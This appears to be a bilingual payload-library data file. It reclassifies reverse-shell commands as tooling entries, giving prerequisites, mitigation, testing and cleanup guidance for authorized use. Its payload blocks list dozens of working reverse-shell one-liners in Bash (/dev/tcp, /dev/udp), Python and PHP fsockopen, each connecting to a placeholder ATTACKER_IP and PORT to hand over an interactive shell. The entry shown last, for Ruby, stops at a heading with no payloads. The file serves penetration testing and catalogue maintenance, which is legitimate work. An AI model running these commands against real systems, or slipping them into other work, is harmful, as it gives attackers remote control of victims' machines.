overview.zh: Bash /dev/tcp 反连命令是工具命令或参考字典，不是独立 Payload。维护目标为不同 Bash 文件描述符布局和 /dev/tcp 写法的运行前提、重复关系与 Shell 兼容性。其适用前提为：命令要求 Bash 支持 /dev/tcp、目标环境允许出站 TCP，并且执行者已拥有命令执行能力。迁移质量以隔离测试主机记录到单次授权连接，命令版本与 Bash 环境匹配且没有把连接本身当成初始漏洞为准，不能把工具命令可运行或字典命中自动报告为目标漏洞。
overview.en: Bash Dev-TCP Reverse Connection Commands is tool command or reference data rather than an independent payload. It maintains runtime prerequisites, duplication, and shell compatibility across Bash file-descriptor layouts and dev-tcp forms. Its prerequisites are the command requires Bash dev-tcp support, outbound TCP access, and pre-existing command execution. Migration quality requires an isolated test host records one authorized connection, the command matches the Bash environment, and the connection is not treated as the initial vulnerability; a runnable tool command or wordlist hit is not automatically a target finding.

vulnerability.zh: 该条目本身不建立漏洞。真实风险取决于命令要求 Bash 支持 /dev/tcp、目标环境允许出站 TCP，并且执行者已拥有命令执行能力，随后才可能用这些命令或特征审查“不同 Bash 文件描述符布局和 /dev/tcp 写法的运行前提、重复关系与 Shell 兼容性”。必须把前置执行入口、目标环境和工具结果分开记录，避免把后渗透能力倒置成初始攻击链。
vulnerability.en: The entry does not establish a vulnerability. Risk depends on the command requires Bash dev-tcp support, outbound TCP access, and pre-existing command execution, after which the commands or signatures may examine runtime prerequisites, duplication, and shell compatibility across Bash file-descriptor layouts and dev-tcp forms. Keep the prerequisite execution entry, target environment, and tool result separate so post-exploitation capability is not inverted into an initial chain.

exploitation.zh: 在一次性容器中先验证 Bash 版本和 /dev/tcp 支持，再逐行比较文件描述符行为并去除仅 Shell 路径不同的重复项。迁移时逐行保留字节、来源、平台或版本标签与副作用说明，执行验证仅限一次性环境和固定无害标记；不支持、失效或仅用于识别的行必须显式标注。
exploitation.en: verify Bash version and dev-tcp support in a disposable container, then compare file-descriptor behavior line by line and deduplicate variants differing only by shell path. Preserve bytes, provenance, platform or version tags, and side effects line by line; execute only in disposable environments with fixed harmless markers, and explicitly label unsupported, invalid, or signature-only lines.

mitigation.zh: 迁入 bash-reverse 工具卡并标注版本、出站网络和监听端前提；主机侧通过最小权限、进程审计与出口控制降低反连风险。工具卡回归需要确认目标入口可达、原命令可复制、精确重复被合并、失效项仍可追溯，并且 Payload 导航不再重复展示纯命令或字典。
mitigation.en: move the commands to bash-reverse with version, egress, and listener prerequisites, while reducing reverse-connection risk through least privilege, process auditing, and egress controls. Tool-card regression must prove the destination is reachable, original commands remain copyable, exact duplicates are merged, invalid items remain traceable, and payload navigation no longer duplicates commands or dictionaries.

title.zh: 核对“Bash /dev/tcp 反连命令”来源与角色
title.en: Verify Bash Dev-TCP Reverse Connection Commands provenance and role

description.zh: 确认该记录是命令或字典而非漏洞数据流，记录来源、平台、版本和前提“命令要求 Bash 支持 /dev/tcp、目标环境允许出站 TCP，并且执行者已拥有命令执行能力”。
description.en: Confirm the record is command or dictionary data rather than a vulnerability flow, recording provenance, platform, version, and prerequisites: the command requires Bash dev-tcp support, outbound TCP access, and pre-existing command execution.

title.zh: 逐行标注“Bash 反连”适用性
title.en: Tag Bash Reverse Connections applicability line by line

description.zh: 按实现、运行时、传输或识别用途分类，记录失效语法、副作用与证据要求“隔离测试主机记录到单次授权连接，命令版本与 Bash 环境匹配且没有把连接本身当成初始漏洞”。
description.en: Classify by implementation, runtime, transport, or signature use and record invalid syntax, side effects, and evidence requirements: an isolated test host records one authorized connection, the command matches the Bash environment, and the connection is not treated as the initial vulnerability.

title.zh: 迁移“Bash /dev/tcp 反连命令”原始命令
title.en: Migrate original Bash Dev-TCP Reverse Connection Commands commands

description.zh: 测试步骤为：在一次性容器中先验证 Bash 版本和 /dev/tcp 支持，再逐行比较文件描述符行为并去除仅 Shell 路径不同的重复项。完整保留原命令并只在一次性环境用固定标记验证。
description.en: verify Bash version and dev-tcp support in a disposable container, then compare file-descriptor behavior line by line and deduplicate variants differing only by shell path. Preserve the original command in full and validate only with fixed markers in a disposable environment.

attackChain.payload:
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
/bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"
bash -c '/bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
bash -c 'bash -i >%26 /dev/tcp/ATTACKER_IP/PORT 0>%261'
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/PORT; sh <&196 >&196 2>&196
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/PORT; /bin/sh <&196 >&196 2>&196
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/PORT; bash <&196 >&196 2>&196
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/PORT; /bin/bash <&196 >&196 2>&196
exec 5<>/dev/tcp/ATTACKER_IP/PORT;cat <&5 | while read line; do $line 2>&5 >&5; done
sh -i 5<> /dev/tcp/ATTACKER_IP/PORT 0<&5 1>&5 2>&5
/bin/sh -i 5<> /dev/tcp/ATTACKER_IP/PORT 0<&5 1>&5 2>&5
bash -i 5<> /dev/tcp/ATTACKER_IP/PORT 0<&5 1>&5 2>&5
/bin/bash -i 5<> /dev/tcp/ATTACKER_IP/PORT 0<&5 1>&5 2>&5

title.zh: 建立目标 Tool 回归
title.en: Regress the destination tool

description.zh: 实施“迁入 bash-reverse 工具卡并标注版本、出站网络和监听端前提；主机侧通过最小权限、进程审计与出口控制降低反连风险”，确认工具入口、复制、去重、版本标签与导航均正确，且 Payload 树不再重复。
description.en: Apply move the commands to bash-reverse with version, egress, and listener prerequisites, while reducing reverse-connection risk through least privilege, process auditing, and egress controls and verify tool access, copying, deduplication, version tags, and navigation without payload-tree duplication.

review.rationale: Bash /dev/tcp 反连命令是纯工具命令或参考字典，应迁入 bash-reverse，保留原始字节、来源和适用前提。

prerequisites.zh: 已确认“Bash /dev/tcp 反连命令”是纯命令/字典，目标 Tool bash-reverse 均存在，并记录来源、版本及前提：命令要求 Bash 支持 /dev/tcp、目标环境允许出站 TCP，并且执行者已拥有命令执行能力。
prerequisites.en: The Bash Dev-TCP Reverse Connection Commands record is command or dictionary data, destination tools bash-reverse exist, and provenance, version, and prerequisites are recorded: the command requires Bash dev-tcp support, outbound TCP access, and pre-existing command execution.

prerequisites.zh: 可在一次性主机或离线解析器逐行验证，并用隔离测试主机记录到单次授权连接，命令版本与 Bash 环境匹配且没有把连接本身当成初始漏洞检查迁移完整性。
prerequisites.en: Every line can be checked in a disposable host or offline parser, using an isolated test host records one authorized connection, the command matches the Bash environment, and the connection is not treated as the initial vulnerability for migration completeness.

analysis.zh: 本条阳性是命令/字典被准确迁移，原字节、来源和隔离测试主机记录到单次授权连接，命令版本与 Bash 环境匹配且没有把连接本身当成初始漏洞保留；它不确认目标漏洞。命令可运行、已有 Shell 回连、字典命中或签名相似均不能证明“不同 Bash 文件描述符布局和 /dev/tcp 写法的运行前提、重复关系与 Shell 兼容性”对应的初始漏洞。
analysis.en: A positive means accurate migration with original bytes, provenance, and an isolated test host records one authorized connection, the command matches the Bash environment, and the connection is not treated as the initial vulnerability; it does not confirm a target vulnerability. Runnable commands, callbacks from an existing shell, wordlist hits, or signature similarity do not prove an initial vulnerability related to runtime prerequisites, duplication, and shell compatibility across Bash file-descriptor layouts and dev-tcp forms.

opsecTips.zh: Bash /dev/tcp 反连命令停止条件：默认离线解析；执行时只用一次性自有地址和固定标记。指向公共地址、生成真实载荷、打开交互 Shell 或触碰非测试文件时立即停止。 本条重点观察“不同 Bash 文件描述符布局和 /dev/tcp 写法的运行前提、重复关系与 Shell 兼容性”。
opsecTips.en: Bash Dev-TCP Reverse Connection Commands stop condition: Prefer offline parsing; use disposable owned destinations and fixed markers if execution is needed. Stop on public destinations, real payload generation, interactive shells, or non-test files. The entry-specific focus is runtime prerequisites, duplication, and shell compatibility across Bash file-descriptor layouts and dev-tcp forms.

opsecTips.zh: Bash /dev/tcp 反连命令清理条件：迁移后关闭监听器，删除 FIFO、生成文件、下载脚本和测试字典副本，销毁环境并核对目标 Tool 无重复或未标记失效行。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Bash Dev-TCP Reverse Connection Commands cleanup condition: Close listeners, remove FIFOs, generated files, downloads, and wordlist copies, destroy the environment, and verify destination tools have no duplicates or untagged invalid lines. Recheck that no triggerable state remains for this technique.

name.zh: Bash /dev/udp 反连命令

description.zh: 使用 Bash /dev/udp 和交互式 sh/bash 的 UDP 反连变体，属于命令工具参考，并不表示 UDP 会提供可靠会话。
description.en: UDP reverse-connection variants using Bash dev-udp and interactive sh or bash; they are command references and do not imply a reliable UDP session.

overview.zh: Bash /dev/udp 反连命令是工具命令或参考字典，不是独立 Payload。维护目标为sh 与 Bash 路径、/dev/udp 支持和无连接 UDP 对交互输入输出可靠性的影响。其适用前提为：目标实际由 Bash 解释重定向、允许出站 UDP，且测试者已经在授权范围内取得命令执行。迁移质量以受控监听器看到唯一数据报并与目标进程日志对应，同时明确记录丢包、无状态和 Shell 不兼容结果为准，不能把工具命令可运行或字典命中自动报告为目标漏洞。
overview.en: Bash Dev-UDP Reverse Connection Commands is tool command or reference data rather than an independent payload. It maintains the effect of sh versus Bash paths, dev-udp support, and connectionless UDP on interactive input and output reliability. Its prerequisites are Bash actually interprets the redirection, outbound UDP is allowed, and command execution has already been obtained within scope. Migration quality requires a controlled listener receives a unique datagram correlated with target process logs while loss, statelessness, and shell incompatibility are recorded; a runnable tool command or wordlist hit is not automatically a target finding.

vulnerability.zh: 该条目本身不建立漏洞。真实风险取决于目标实际由 Bash 解释重定向、允许出站 UDP，且测试者已经在授权范围内取得命令执行，随后才可能用这些命令或特征审查“sh 与 Bash 路径、/dev/udp 支持和无连接 UDP 对交互输入输出可靠性的影响”。必须把前置执行入口、目标环境和工具结果分开记录，避免把后渗透能力倒置成初始攻击链。
vulnerability.en: The entry does not establish a vulnerability. Risk depends on Bash actually interprets the redirection, outbound UDP is allowed, and command execution has already been obtained within scope, after which the commands or signatures may examine the effect of sh versus Bash paths, dev-udp support, and connectionless UDP on interactive input and output reliability. Keep the prerequisite execution entry, target environment, and tool result separate so post-exploitation capability is not inverted into an initial chain.

exploitation.zh: 在隔离容器中分别由 dash、sh 与 Bash 调用四个变体，记录解析错误、首个数据报和交互稳定性，不把超时自动判断为安全。迁移时逐行保留字节、来源、平台或版本标签与副作用说明，执行验证仅限一次性环境和固定无害标记；不支持、失效或仅用于识别的行必须显式标注。
exploitation.en: invoke the four variants under dash, sh, and Bash in isolation, recording parse errors, first datagrams, and interaction stability without treating timeout as proof of safety. Preserve bytes, provenance, platform or version tags, and side effects line by line; execute only in disposable environments with fixed harmless markers, and explicitly label unsupported, invalid, or signature-only lines.

mitigation.zh: 合并到 bash-reverse 并注明 UDP 的限制与 Bash 专属语法，主机策略应限制不必要的出站 UDP 并监控交互 Shell 子进程。工具卡回归需要确认目标入口可达、原命令可复制、精确重复被合并、失效项仍可追溯，并且 Payload 导航不再重复展示纯命令或字典。
mitigation.en: merge into bash-reverse with UDP limitations and Bash-specific syntax documented, while restricting unnecessary UDP egress and monitoring interactive shell child processes. Tool-card regression must prove the destination is reachable, original commands remain copyable, exact duplicates are merged, invalid items remain traceable, and payload navigation no longer duplicates commands or dictionaries.

title.zh: 核对“Bash /dev/udp 反连命令”来源与角色
title.en: Verify Bash Dev-UDP Reverse Connection Commands provenance and role

description.zh: 确认该记录是命令或字典而非漏洞数据流，记录来源、平台、版本和前提“目标实际由 Bash 解释重定向、允许出站 UDP，且测试者已经在授权范围内取得命令执行”。
description.en: Confirm the record is command or dictionary data rather than a vulnerability flow, recording provenance, platform, version, and prerequisites: Bash actually interprets the redirection, outbound UDP is allowed, and command execution has already been obtained within scope.

title.zh: 逐行标注“Bash UDP 反连”适用性
title.en: Tag Bash UDP Reverse Connections applicability line by line

description.zh: 按实现、运行时、传输或识别用途分类，记录失效语法、副作用与证据要求“受控监听器看到唯一数据报并与目标进程日志对应，同时明确记录丢包、无状态和 Shell 不兼容结果”。
description.en: Classify by implementation, runtime, transport, or signature use and record invalid syntax, side effects, and evidence requirements: a controlled listener receives a unique datagram correlated with target process logs while loss, statelessness, and shell incompatibility are recorded.

title.zh: 迁移“Bash /dev/udp 反连命令”原始命令
title.en: Migrate original Bash Dev-UDP Reverse Connection Commands commands

description.zh: 测试步骤为：在隔离容器中分别由 dash、sh 与 Bash 调用四个变体，记录解析错误、首个数据报和交互稳定性，不把超时自动判断为安全。完整保留原命令并只在一次性环境用固定标记验证。
description.en: invoke the four variants under dash, sh, and Bash in isolation, recording parse errors, first datagrams, and interaction stability without treating timeout as proof of safety. Preserve the original command in full and validate only with fixed markers in a disposable environment.

attackChain.payload:
sh -i >& /dev/udp/ATTACKER_IP/PORT 0>&1
/bin/sh -i >& /dev/udp/ATTACKER_IP/PORT 0>&1
bash -i >& /dev/udp/ATTACKER_IP/PORT 0>&1
/bin/bash -i >& /dev/udp/ATTACKER_IP/PORT 0>&1

name.zh: Python IPv4 Socket 反连命令
name.en: Python IPv4 Socket Reverse Connection Commands

description.zh: 组合 socket、dup2、subprocess 与 pty 的 Python 2/3 IPv4 反连命令，属于 Python 工具命令并包含大量 Shell 路径重复变体。
description.en: Python 2 and 3 IPv4 reverse-connection commands combining socket, dup2, subprocess, and pty, with many duplicate shell-path variants that belong in tooling.

overview.zh: Python IPv4 Socket 反连命令是工具命令或参考字典，不是独立 Payload。维护目标为Python 版本、socket 连接、文件描述符复制与 pty 启动方式之间的兼容性和重复关系。其适用前提为：目标存在可执行的 Python 解释器，允许到测试地址的出站 TCP，并已具备授权命令执行入口。迁移质量以隔离监听器的唯一连接与 Python PID、版本和标准流重定向日志相对应为准，不能把工具命令可运行或字典命中自动报告为目标漏洞。
overview.en: Python IPv4 Socket Reverse Connection Commands is tool command or reference data rather than an independent payload. It maintains compatibility and duplication across Python versions, socket connections, file-descriptor duplication, and pty startup forms. Its prerequisites are the target has an executable Python interpreter, permits outbound TCP to the test address, and already exposes an authorized command-execution entry. Migration quality requires a unique isolated-listener connection correlates with the Python PID, version, and standard-stream redirection logs; a runnable tool command or wordlist hit is not automatically a target finding.

vulnerability.zh: 该条目本身不建立漏洞。真实风险取决于目标存在可执行的 Python 解释器，允许到测试地址的出站 TCP，并已具备授权命令执行入口，随后才可能用这些命令或特征审查“Python 版本、socket 连接、文件描述符复制与 pty 启动方式之间的兼容性和重复关系”。必须把前置执行入口、目标环境和工具结果分开记录，避免把后渗透能力倒置成初始攻击链。
vulnerability.en: The entry does not establish a vulnerability. Risk depends on the target has an executable Python interpreter, permits outbound TCP to the test address, and already exposes an authorized command-execution entry, after which the commands or signatures may examine compatibility and duplication across Python versions, socket connections, file-descriptor duplication, and pty startup forms. Keep the prerequisite execution entry, target environment, and tool result separate so post-exploitation capability is not inverted into an initial chain.

exploitation.zh: 在 Python 2 与 3 一次性环境中逐行运行，比较 subprocess.call 与 pty.spawn 的会话行为，并按解释器与 Shell 路径合并等价项。迁移时逐行保留字节、来源、平台或版本标签与副作用说明，执行验证仅限一次性环境和固定无害标记；不支持、失效或仅用于识别的行必须显式标注。
exploitation.en: run each line in disposable Python 2 and 3 environments, compare subprocess.call with pty.spawn behavior, and merge equivalents by interpreter and shell path. Preserve bytes, provenance, platform or version tags, and side effects line by line; execute only in disposable environments with fixed harmless markers, and explicitly label unsupported, invalid, or signature-only lines.

mitigation.zh: 迁入 python-reverse 并保留 Python 版本与 pty 标签；运行环境应移除不必要解释器、限制出口并审计 socket 与交互 Shell 行为。工具卡回归需要确认目标入口可达、原命令可复制、精确重复被合并、失效项仍可追溯，并且 Payload 导航不再重复展示纯命令或字典。
mitigation.en: move to python-reverse with Python-version and pty tags, and remove unnecessary interpreters, restrict egress, and audit socket plus interactive-shell behavior. Tool-card regression must prove the destination is reachable, original commands remain copyable, exact duplicates are merged, invalid items remain traceable, and payload navigation no longer duplicates commands or dictionaries.

title.zh: 核对“Python IPv4 Socket 反连命令”来源与角色
title.en: Verify Python IPv4 Socket Reverse Connection Commands provenance and role

description.zh: 确认该记录是命令或字典而非漏洞数据流，记录来源、平台、版本和前提“目标存在可执行的 Python 解释器，允许到测试地址的出站 TCP，并已具备授权命令执行入口”。
description.en: Confirm the record is command or dictionary data rather than a vulnerability flow, recording provenance, platform, version, and prerequisites: the target has an executable Python interpreter, permits outbound TCP to the test address, and already exposes an authorized command-execution entry.

title.zh: 逐行标注“Python Socket 反连”适用性
title.en: Tag Python Socket Reverse Connections applicability line by line

description.zh: 按实现、运行时、传输或识别用途分类，记录失效语法、副作用与证据要求“隔离监听器的唯一连接与 Python PID、版本和标准流重定向日志相对应”。
description.en: Classify by implementation, runtime, transport, or signature use and record invalid syntax, side effects, and evidence requirements: a unique isolated-listener connection correlates with the Python PID, version, and standard-stream redirection logs.

title.zh: 迁移“Python IPv4 Socket 反连命令”原始命令
title.en: Migrate original Python IPv4 Socket Reverse Connection Commands commands

description.zh: 测试步骤为：在 Python 2 与 3 一次性环境中逐行运行，比较 subprocess.call 与 pty.spawn 的会话行为，并按解释器与 Shell 路径合并等价项。完整保留原命令并只在一次性环境用固定标记验证。
description.en: run each line in disposable Python 2 and 3 environments, compare subprocess.call with pty.spawn behavior, and merge equivalents by interpreter and shell path. Preserve the original command in full and validate only with fixed markers in a disposable environment.

attackChain.payload:
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'

title.zh: 建立目标 Tool 回归
title.en: Regress the destination tool

description.zh: 实施“迁入 python-reverse 并保留 Python 版本与 pty 标签；运行环境应移除不必要解释器、限制出口并审计 socket 与交互 Shell 行为”，确认工具入口、复制、去重、版本标签与导航均正确，且 Payload 树不再重复。
description.en: Apply move to python-reverse with Python-version and pty tags, and remove unnecessary interpreters, restrict egress, and audit socket plus interactive-shell behavior and verify tool access, copying, deduplication, version tags, and navigation without payload-tree duplication.

review.rationale: Python IPv4 Socket 反连命令是纯工具命令或参考字典，应迁入 python-reverse，保留原始字节、来源和适用前提。

prerequisites.zh: 已确认“Python IPv4 Socket 反连命令”是纯命令/字典，目标 Tool python-reverse 均存在，并记录来源、版本及前提：目标存在可执行的 Python 解释器，允许到测试地址的出站 TCP，并已具备授权命令执行入口。
prerequisites.en: The Python IPv4 Socket Reverse Connection Commands record is command or dictionary data, destination tools python-reverse exist, and provenance, version, and prerequisites are recorded: the target has an executable Python interpreter, permits outbound TCP to the test address, and already exposes an authorized command-execution entry.

prerequisites.zh: 可在一次性主机或离线解析器逐行验证，并用隔离监听器的唯一连接与 Python PID、版本和标准流重定向日志相对应检查迁移完整性。
prerequisites.en: Every line can be checked in a disposable host or offline parser, using a unique isolated-listener connection correlates with the Python PID, version, and standard-stream redirection logs for migration completeness.

analysis.zh: 本条阳性是命令/字典被准确迁移，原字节、来源和隔离监听器的唯一连接与 Python PID、版本和标准流重定向日志相对应保留；它不确认目标漏洞。命令可运行、已有 Shell 回连、字典命中或签名相似均不能证明“Python 版本、socket 连接、文件描述符复制与 pty 启动方式之间的兼容性和重复关系”对应的初始漏洞。
analysis.en: A positive means accurate migration with original bytes, provenance, and a unique isolated-listener connection correlates with the Python PID, version, and standard-stream redirection logs; it does not confirm a target vulnerability. Runnable commands, callbacks from an existing shell, wordlist hits, or signature similarity do not prove an initial vulnerability related to compatibility and duplication across Python versions, socket connections, file-descriptor duplication, and pty startup forms.

opsecTips.zh: Python IPv4 Socket 反连命令停止条件：默认离线解析；执行时只用一次性自有地址和固定标记。指向公共地址、生成真实载荷、打开交互 Shell 或触碰非测试文件时立即停止。 本条重点观察“Python 版本、socket 连接、文件描述符复制与 pty 启动方式之间的兼容性和重复关系”。
opsecTips.en: Python IPv4 Socket Reverse Connection Commands stop condition: Prefer offline parsing; use disposable owned destinations and fixed markers if execution is needed. Stop on public destinations, real payload generation, interactive shells, or non-test files. The entry-specific focus is compatibility and duplication across Python versions, socket connections, file-descriptor duplication, and pty startup forms.

opsecTips.zh: Python IPv4 Socket 反连命令清理条件：迁移后关闭监听器，删除 FIFO、生成文件、下载脚本和测试字典副本，销毁环境并核对目标 Tool 无重复或未标记失效行。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Python IPv4 Socket Reverse Connection Commands cleanup condition: Close listeners, remove FIFOs, generated files, downloads, and wordlist copies, destroy the environment, and verify destination tools have no duplicates or untagged invalid lines. Recheck that no triggerable state remains for this technique.

name.zh: PHP fsockopen 反连命令

description.zh: 以 php -r、fsockopen 和多种进程执行函数建立反连标准流，属于 PHP CLI 工具参考，不是上传后直接访问的 WebShell 文件。
description.en: Uses php -r, fsockopen, and several process-execution functions to connect standard streams; this is PHP CLI tooling rather than a webshell file served after upload.

overview.zh: PHP fsockopen 反连命令是工具命令或参考字典，不是独立 Payload。维护目标为fsockopen 连接描述符与反引号、exec、system、passthru、popen、shell_exec 和 proc_open 的标准流绑定差异。其适用前提为：PHP CLI 可用、相关执行函数未被禁用、文件描述符编号符合运行环境且出站 TCP 获准。迁移质量以一次性 PHP 进程的函数调用错误、描述符状态和受控监听连接能够对应到同一变体为准，不能把工具命令可运行或字典命中自动报告为目标漏洞。
overview.en: PHP Fsockopen Reverse Connection Commands is tool command or reference data rather than an independent payload. It maintains differences in binding an fsockopen descriptor to backticks, exec, system, passthru, popen, shell_exec, and proc_open. Its prerequisites are PHP CLI is available, the selected execution function is enabled, descriptor numbering matches the environment, and outbound TCP is authorized. Migration quality requires function errors, descriptor state, and a controlled listener connection from one disposable PHP process correlate to the same variant; a runnable tool command or wordlist hit is not automatically a target finding.

vulnerability.zh: 该条目本身不建立漏洞。真实风险取决于PHP CLI 可用、相关执行函数未被禁用、文件描述符编号符合运行环境且出站 TCP 获准，随后才可能用这些命令或特征审查“fsockopen 连接描述符与反引号、exec、system、passthru、popen、shell_exec 和 proc_open 的标准流绑定差异”。必须把前置执行入口、目标环境和工具结果分开记录，避免把后渗透能力倒置成初始攻击链。
vulnerability.en: The entry does not establish a vulnerability. Risk depends on PHP CLI is available, the selected execution function is enabled, descriptor numbering matches the environment, and outbound TCP is authorized, after which the commands or signatures may examine differences in binding an fsockopen descriptor to backticks, exec, system, passthru, popen, shell_exec, and proc_open. Keep the prerequisite execution entry, target environment, and tool result separate so post-exploitation capability is not inverted into an initial chain.

exploitation.zh: 在隔离 PHP CLI 中逐个函数验证语法和描述符，不使用真实 Web 进程；记录禁用函数、版本差异和无法闭合的首行语法。迁移时逐行保留字节、来源、平台或版本标签与副作用说明，执行验证仅限一次性环境和固定无害标记；不支持、失效或仅用于识别的行必须显式标注。
exploitation.en: validate syntax and descriptors one function at a time in isolated PHP CLI rather than a live web process, recording disabled functions, version differences, and the unterminated first-line form. Preserve bytes, provenance, platform or version tags, and side effects line by line; execute only in disposable environments with fixed harmless markers, and explicitly label unsupported, invalid, or signature-only lines.

mitigation.zh: 迁入 php-reverse 并标注失效或版本相关行；生产 PHP 禁止不需要的进程函数，采用最小权限与出口限制。工具卡回归需要确认目标入口可达、原命令可复制、精确重复被合并、失效项仍可追溯，并且 Payload 导航不再重复展示纯命令或字典。
mitigation.en: move to php-reverse and tag invalid or version-specific lines, while production PHP disables unnecessary process functions and uses least privilege plus egress controls. Tool-card regression must prove the destination is reachable, original commands remain copyable, exact duplicates are merged, invalid items remain traceable, and payload navigation no longer duplicates commands or dictionaries.

title.zh: 核对“PHP fsockopen 反连命令”来源与角色
title.en: Verify PHP Fsockopen Reverse Connection Commands provenance and role

description.zh: 确认该记录是命令或字典而非漏洞数据流，记录来源、平台、版本和前提“PHP CLI 可用、相关执行函数未被禁用、文件描述符编号符合运行环境且出站 TCP 获准”。
description.en: Confirm the record is command or dictionary data rather than a vulnerability flow, recording provenance, platform, version, and prerequisites: PHP CLI is available, the selected execution function is enabled, descriptor numbering matches the environment, and outbound TCP is authorized.

title.zh: 逐行标注“PHP CLI 反连”适用性
title.en: Tag PHP CLI Reverse Connections applicability line by line

description.zh: 按实现、运行时、传输或识别用途分类，记录失效语法、副作用与证据要求“一次性 PHP 进程的函数调用错误、描述符状态和受控监听连接能够对应到同一变体”。
description.en: Classify by implementation, runtime, transport, or signature use and record invalid syntax, side effects, and evidence requirements: function errors, descriptor state, and a controlled listener connection from one disposable PHP process correlate to the same variant.

title.zh: 迁移“PHP fsockopen 反连命令”原始命令
title.en: Migrate original PHP Fsockopen Reverse Connection Commands commands

description.zh: 测试步骤为：在隔离 PHP CLI 中逐个函数验证语法和描述符，不使用真实 Web 进程；记录禁用函数、版本差异和无法闭合的首行语法。完整保留原命令并只在一次性环境用固定标记验证。
description.en: validate syntax and descriptors one function at a time in isolated PHP CLI rather than a live web process, recording disabled functions, version differences, and the unterminated first-line form. Preserve the original command in full and validate only with fixed markers in a disposable environment.

attackChain.payload:
php -r '$sock=fsockopen("ATTACKER_IP",PORT);`/bin/sh -i <&3 >&3 2>&3`;
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER_IP",PORT);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER_IP",PORT);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER_IP",PORT);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
php -r '$sock=fsockopen("ATTACKER_IP",PORT);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER_IP",PORT);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'

name.zh: Ruby TCPSocket 反连命令

description.zh: 使用 TCPSocket、exec 和 IO.popen 的 Ruby 反连命令，属于 Ruby 运行时工具用法，并包含前台与 fork 后台会话变体。
description.en: Ruby reverse-connection commands using TCPSocket, exec, and IO.popen, including foreground and forked session variants that belong in runtime tooling.

overview.zh: Ruby TCPSocket 反连命令是工具命令或参考字典，不是独立 Payload。维护目标为TCPSocket 文件描述符交给 exec 与循环 IO.popen 两种实现的进程生命周期和输出行为。其适用前提为：目标提供 Ruby 与 socket 库，出站 TCP 已获授权，并且测试入口已经允许执行 Ruby 命令。迁移质量以受控连接与 Ruby PID、是否 fork、子进程命令和输出边界均可关联为准，不能把工具命令可运行或字典命中自动报告为目标漏洞。
overview.en: Ruby TCPSocket Reverse Connection Commands is tool command or reference data rather than an independent payload. It maintains process lifecycle and output behavior when a TCPSocket descriptor is handed to exec versus a looping IO.popen implementation. Its prerequisites are the target provides Ruby and its socket library, outbound TCP is authorized, and the test entry already allows Ruby execution. Migration quality requires the controlled connection correlates with the Ruby PID, fork state, child command, and output boundary; a runnable tool command or wordlist hit is not automatically a target finding.

vulnerability.zh: 该条目本身不建立漏洞。真实风险取决于目标提供 Ruby 与 socket 库，出站 TCP 已获授权，并且测试入口已经允许执行 Ruby 命令，随后才可能用这些命令或特征审查“TCPSocket 文件描述符交给 exec 与循环 IO.popen 两种实现的进程生命周期和输出行为”。必须把前置执行入口、目标环境和工具结果分开记录，避免把后渗透能力倒置成初始攻击链。
vulnerability.en: The entry does not establish a vulnerability. Risk depends on the target provides Ruby and its socket library, outbound TCP is authorized, and the test entry already allows Ruby execution, after which the commands or signatures may examine process lifecycle and output behavior when a TCPSocket descriptor is handed to exec versus a looping IO.popen implementation. Keep the prerequisite execution entry, target environment, and tool result separate so post-exploitation capability is not inverted into an initial chain.

exploitation.zh: 在一次性 Ruby 环境中分别运行 exec、fork 循环与前台循环形式，发送固定 echo 标记并检查退出和资源释放。迁移时逐行保留字节、来源、平台或版本标签与副作用说明，执行验证仅限一次性环境和固定无害标记；不支持、失效或仅用于识别的行必须显式标注。
exploitation.en: run the exec, forked loop, and foreground loop forms separately in disposable Ruby, send a fixed echo marker, and inspect exit and resource cleanup. Preserve bytes, provenance, platform or version tags, and side effects line by line; execute only in disposable environments with fixed harmless markers, and explicitly label unsupported, invalid, or signature-only lines.

mitigation.zh: 迁入 ruby-reverse 并标记会话模型；生产主机限制 Ruby 解释器、出站连接和任意子进程创建。工具卡回归需要确认目标入口可达、原命令可复制、精确重复被合并、失效项仍可追溯，并且 Payload 导航不再重复展示纯命令或字典。
mitigation.en: move to ruby-reverse with session-model tags, while production hosts restrict Ruby interpreters, outbound connections, and arbitrary child-process creation. Tool-card regression must prove the destination is reachable, original commands remain copyable, exact duplicates are merged, invalid items remain traceable, and payload navigation no longer duplicates commands or dictionaries.

title.zh: 迁移“Ruby TCPSocket 反连命令”原始命令
title.en: Migrate original Ruby TCPSocket Reverse Connection Commands commands

